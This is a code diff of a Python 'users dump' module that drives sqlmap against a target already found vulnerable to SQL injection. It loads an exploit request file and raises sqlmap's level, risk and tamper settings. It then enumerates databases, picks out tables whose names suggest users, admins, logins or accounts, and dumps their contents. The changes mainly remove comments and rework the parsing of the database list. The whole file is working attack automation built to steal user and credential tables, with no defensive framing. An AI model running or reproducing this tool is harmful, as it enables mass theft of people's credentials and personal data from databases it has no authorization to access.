@@ -47,7 +47,6 @@ SQLMAP_DEFAULT_PATHS = [
 # YOUR TECHNIQUES - RISK LEVEL, TAMPERS, ETC
 # ============================================================================
 
-# SQLMAP ADVANCED OPTIONS - YOUR TECHNIQUES
 SQLMAP_LEVEL = "5"
 SQLMAP_RISK = "3"
 SQLMAP_TIME_SEC = "11"
@@ -61,7 +60,6 @@ SQLMAP_TIMEOUT = "30"
 SQLMAP_RETRIES = "3"
 SQLMAP_UNION_CHAR = "UCHAR"
 
-# Keywords for user tables
 USER_TABLE_KEYWORDS = [
     'user', 'users', 'admin', 'admins', 'member', 'members',
     'login', 'logins', 'account', 'accounts', 'profile', 'profiles',
@@ -69,7 +67,6 @@ USER_TABLE_KEYWORDS = [
     'auth', 'role', 'roles', 'wp_users', 'admin_users'
 ]
 
-# SQLMAP ANSWERS
 SQLMAP_ANSWERS = "continue=Y,quit=N,proceed=Y,crack=Y,dict=Y,resolve=Y,follow=Y,test=Y"
 
 # ============================================================================
@@ -77,7 +74,6 @@ SQLMAP_ANSWERS = "continue=Y,quit=N,proceed=Y,crack=Y,dict=Y,resolve=Y,follow=Y,
 # ============================================================================
 
 def display_banner():
-    """Display module banner"""
     print(Fore.CYAN + """
 ╔═══════════════════════════════════════════════════════════════╗
 ║                    👥 USERS DUMP MODULE                       ║
@@ -87,7 +83,6 @@ def display_banner():
 """ + Style.RESET_ALL)
 
 def find_sqlmap():
-    """Find sqlmap installation"""
     env_path = os.getenv(SQLMAP_ENV_VAR)
     if env_path:
         p = Path(env_path)
@@ -105,7 +100,6 @@ def find_sqlmap():
     return None
 
 def load_exploit():
-    """Load exploit file and parameters"""
     if not EXPLOIT_PATH.exists():
         print(Fore.RED + "❌ exploit.txt not found! Generate PoC first." + Style.RESET_ALL)
         return None, None
@@ -122,9 +116,6 @@ def load_exploit():
         return None, None
 
 def get_base_cmd(sqlmap_path, exploit_path, vuln_params):
-    """
-    Build base sqlmap command with YOUR TECHNIQUES
-    """
     if sqlmap_path.endswith(".py"):
         cmd = [sys.executable, sqlmap_path]
     else:
@@ -154,13 +145,10 @@ def get_base_cmd(sqlmap_path, exploit_path, vuln_params):
     return cmd
 
 def run_sqlmap_with_techniques(cmd, description=""):
-    """
-    Run sqlmap with YOUR TECHNIQUES and capture output
-    """
     if description:
         print(Fore.CYAN + f"\n[+] {description}" + Style.RESET_ALL)
     
-    print(Fore.YELLOW + "[*] Running sqlmap with your techniques (level=5, risk=3, time-sec=11, tamper=space2comment,between,charencode)..." + Style.RESET_ALL)
+    print(Fore.YELLOW + "[*] Running sqlmap with your techniques..." + Style.RESET_ALL)
     print("-" * 60)
     
     try:
@@ -177,9 +165,6 @@ def run_sqlmap_with_techniques(cmd, description=""):
         return ""
 
 def get_databases(sqlmap_path, exploit_path, vuln_params):
-    """
-    Get all databases using sqlmap --dbs with YOUR TECHNIQUES
-    """
     print(Fore.CYAN + "\n[+] Getting databases with your techniques..." + Style.RESET_ALL)
     
     cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
@@ -191,15 +176,27 @@ def get_databases(sqlmap_path, exploit_path, vuln_params):
         return []
     
     databases = []
-    # FILTER - only keep REAL databases (no system, no test, no starting/ending)
+    in_db_section = False
+    # ONLY system databases are filtered
     skip = ['information_schema', 'performance_schema', 'mysql', 'sys', 'phpmyadmin', 'starting', 'ending']
     
     for line in output.split('\n'):
-        match = re.search(r'\[\*\]\s+(\w+)', line)
-        if match:
-            db = match.group(1)
-            if db.lower() not in skip:
-                databases.append(db)
+        # Start collecting when we see the database list header
+        if "available databases [" in line.lower():
+            in_db_section = True
+            continue
+        
+        if in_db_section:
+            match = re.search(r'\[\*\]\s+([\w\-_]+)', line)
+            if match:
+                db = match.group(1)
+                if db.lower() not in skip:
+                    databases.append(db)
+            else:
+                if line.strip() and not line.strip().startswith('['):
+                    in_db_section = False
+    
+    databases = sorted(set(databases))
     
     if not databases:
         print(Fore.YELLOW + "[!] No databases found. Using current database." + Style.RESET_ALL)
@@ -208,11 +205,8 @@ def get_databases(sqlmap_path, exploit_path, vuln_params):
     return databases
 
 def get_tables_from_db(sqlmap_path, exploit_path, vuln_params, database):
-    """
-    Get all tables from a database using sqlmap --tables with YOUR TECHNIQUES
-    """
     db_name = database if database else "current database"
-    print(Fore.CYAN + f"[*] Getting tables from: {db_name} with your techniques..." + Style.RESET_ALL)
+    print(Fore.CYAN + f"[*] Getting tables from: {db_name}..." + Style.RESET_ALL)
     
     cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
     
@@ -243,25 +237,19 @@ def get_tables_from_db(sqlmap_path, exploit_path, vuln_params, database):
     return list(set(tables))
 
 def find_user_tables(sqlmap_path, exploit_path, vuln_params):
-    """
-    Find all user tables using sqlmap with YOUR TECHNIQUES
-    """
-    print(Fore.CYAN + "\n[+] Finding ALL user tables using your techniques (level=5, risk=3, time-sec=11)..." + Style.RESET_ALL)
+    print(Fore.CYAN + "\n[+] Finding ALL user tables..." + Style.RESET_ALL)
     
-    # Step 1: Get databases
     databases = get_databases(sqlmap_path, exploit_path, vuln_params)
     
     if not databases:
         print(Fore.YELLOW + "[!] No databases found." + Style.RESET_ALL)
         return []
     
-    # Step 2: Get tables from each database
     all_tables = []
     
     for db in databases:
         tables = get_tables_from_db(sqlmap_path, exploit_path, vuln_params, db)
         
-        # Filter for user-related tables
         for table in tables:
             table_lower = table.lower()
             if any(kw in table_lower for kw in USER_TABLE_KEYWORDS):
@@ -272,10 +260,7 @@ def find_user_tables(sqlmap_path, exploit_path, vuln_params):
     return sorted(set(all_tables))
 
 def dump_user_table(sqlmap_path, exploit_path, vuln_params, full_table_name):
-    """
-    Dump a user table using sqlmap --dump with YOUR TECHNIQUES
-    """
-    print(Fore.CYAN + f"\n[+] Dumping table: {full_table_name} with your techniques..." + Style.RESET_ALL)
+    print(Fore.CYAN + f"\n[+] Dumping table: {full_table_name}..." + Style.RESET_ALL)
     
     if '.' in full_table_name:
         db, table = full_table_name.split('.', 1)
@@ -288,12 +273,9 @@ def dump_user_table(sqlmap_path, exploit_path, vuln_params, full_table_name):
     if db:
         cmd += ["-D", db]
     
-    cmd += [
-        "-T", table,
-        "--dump",
-    ]
+    cmd += ["-T", table, "--dump"]
     
-    print(Fore.YELLOW + f"[*] Dumping {full_table_name} with level={SQLMAP_LEVEL}, risk={SQLMAP_RISK}, time-sec={SQLMAP_TIME_SEC}..." + Style.RESET_ALL)
+    print(Fore.YELLOW + f"[*] Dumping {full_table_name}..." + Style.RESET_ALL)
     print(Fore.YELLOW + "[!] Press Ctrl+C to skip this table" + Style.RESET_ALL)
     print("-" * 60)
     
@@ -315,52 +297,40 @@ def dump_user_table(sqlmap_path, exploit_path, vuln_params, full_table_name):
         return False
 
 def run_users_dump():
-    """Main function - find and dump ALL user tables using YOUR TECHNIQUES"""
     display_banner()
     
-    # Check if exploit exists
     if not EXPLOIT_PATH.exists():
         print(Fore.RED + "❌ exploit.txt not found!" + Style.RESET_ALL)
-        print(Fore.YELLOW + "Please generate PoC first using option 1 from main menu." + Style.RESET_ALL)
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # Find sqlmap
     sqlmap_path = find_sqlmap()
     if not sqlmap_path:
         print(Fore.RED + "❌ sqlmap not found!" + Style.RESET_ALL)
-        print(Fore.YELLOW + f"Set {SQLMAP_ENV_VAR} or install sqlmap." + Style.RESET_ALL)
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # Load exploit
     exploit_path, vuln_params = load_exploit()
     if not exploit_path:
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # Show configuration with YOUR TECHNIQUES
-    print(Fore.CYAN + "\n[*] Configuration with YOUR TECHNIQUES:" + Style.RESET_ALL)
+    print(Fore.CYAN + "\n[*] Configuration:" + Style.RESET_ALL)
     print(f"    SQLMap: {sqlmap_path}")
-    print(f"    Exploit: {exploit_path}")
     print(f"    Level: {SQLMAP_LEVEL}")
     print(f"    Risk: {SQLMAP_RISK}")
     print(f"    Time-Sec: {SQLMAP_TIME_SEC}")
     print(f"    Tamper: {SQLMAP_TAMPERS}")
-    print(f"    No-Cast: {SQLMAP_NO_CAST}")
-    print(f"    No-Escape: {SQLMAP_NO_ESCAPE}")
     if vuln_params:
         print(f"    Parameters: {vuln_params}")
     print()
     
-    # Confirm
-    confirm = input(Fore.YELLOW + "Start USERS scan and dump with your techniques? [Y/n]: " + Style.RESET_ALL).strip().lower()
+    confirm = input(Fore.YELLOW + "Start USERS scan and dump? [Y/n]: " + Style.RESET_ALL).strip().lower()
     if confirm not in ("", "y", "yes"):
         print(Fore.YELLOW + "Cancelled." + Style.RESET_ALL)
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # STEP 1: Get all databases
     databases = get_databases(sqlmap_path, exploit_path, vuln_params)
     
     if not databases:
@@ -368,7 +338,6 @@ def run_users_dump():
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # Show databases and let user select
     print(Fore.CYAN + "\n" + "="*60)
     print("AVAILABLE DATABASES:")
     print("="*60 + Style.RESET_ALL)
@@ -398,9 +367,7 @@ def run_users_dump():
             input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
             return
     
-    # STEP 2: Find user tables from selected databases
     all_user_tables = []
-    
     for db in selected_databases:
         print(Fore.CYAN + f"\n[+] Scanning database: {db if db else 'current'}" + Style.RESET_ALL)
         tables = get_tables_from_db(sqlmap_path, exploit_path, vuln_params, db)
@@ -413,11 +380,10 @@ def run_users_dump():
                     all_user_tables.append(full_name)
     
     if not all_user_tables:
-        print(Fore.YELLOW + "\n[!] No user tables found in selected databases!" + Style.RESET_ALL)
+        print(Fore.YELLOW + "\n[!] No user tables found!" + Style.RESET_ALL)
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # Show found tables
     print(Fore.CYAN + "\n" + "="*60)
     print("FOUND USER TABLES:")
     print("="*60 + Style.RESET_ALL)
@@ -425,14 +391,13 @@ def run_users_dump():
         print(f"{i}. {table}")
     print("="*60)
     
-    # Ask which tables to dump
     dump_all = input(Fore.YELLOW + "\nDump ALL tables? [Y/n]: " + Style.RESET_ALL).strip().lower()
     
     tables_to_dump = []
     if dump_all in ("", "y", "yes"):
         tables_to_dump = all_user_tables
     else:
-        print(Fore.CYAN + "Enter table numbers to dump (comma-separated, e.g., 1,3,5):" + Style.RESET_ALL)
+        print(Fore.CYAN + "Enter table numbers to dump (comma-separated):" + Style.RESET_ALL)
         selection = input(Fore.YELLOW + "Selection: " + Style.RESET_ALL).strip()
         if selection:
             try:
@@ -448,12 +413,9 @@ def run_users_dump():
         input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
         return
     
-    # STEP 3: Dump selected tables with YOUR TECHNIQUES
     print(Fore.CYAN + "\n" + "="*60)
-    print(f"DUMPING {len(tables_to_dump)} USER TABLES WITH YOUR TECHNIQUES")
+    print(f"DUMPING {len(tables_to_dump)} USER TABLES")
     print("="*60 + Style.RESET_ALL)
-    print(Fore.CYAN + f"[*] Using: level={SQLMAP_LEVEL}, risk={SQLMAP_RISK}, time-sec={SQLMAP_TIME_SEC}" + Style.RESET_ALL)
-    print(Fore.CYAN + f"[*] Tamper: {SQLMAP_TAMPERS}" + Style.RESET_ALL)
     print(Fore.CYAN + "[*] SQLmap will save results to its default output directory" + Style.RESET_ALL)
     print(Fore.CYAN + "[*] SQLmap output will appear below with original colors:" + Style.RESET_ALL)
     print("="*60)
@@ -466,7 +428,6 @@ def run_users_dump():
         if dump_user_table(sqlmap_path, exploit_path, vuln_params, table):
             success_count += 1
     
-    # Summary
     print(Fore.CYAN + "\n" + "="*60)
     print("USERS DUMP COMPLETE")
     print("="*60 + Style.RESET_ALL)
@@ -476,10 +437,6 @@ def run_users_dump():
     print("="*60)
     
     input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
-
-# ============================================================================
-# MAIN ENTRYPOINT
-# ============================================================================
 
 if __name__ == "__main__":
     run_users_dump()
